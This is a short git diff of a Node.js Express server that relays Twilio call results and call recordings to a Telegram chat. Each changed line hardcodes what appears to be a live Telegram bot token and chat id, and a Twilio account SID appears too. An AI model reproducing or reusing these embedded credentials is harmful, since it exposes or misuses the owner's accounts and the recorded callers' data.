@@ -51,8 +51,7 @@ app.post('/handle-key', (req, res) => {
 app.post('/callOutputs', (req, res) => {
     axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendMessage?chat_id=5113588348&text=Call result: ' + JSON.stringify(req.body)) 
     if(req.body.RecordingUrl){
-        // bot.sendAudio("5113588348",req.body.RecordingUrl + ".mp3")
-        bot.sendAudio("5113588348","https://api.twilio.com/2010-04-01/Accounts/AC17dc9fe91f769fba66f6e8611597b0b7/Recordings/RE5cebc1eb0e461655bdb128a1c31ec837.mp3")
+        axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendAudio?chat_id=5113588348&audio=' + req.body.RecordingUrl + ".mp3") 
     }
 });
 
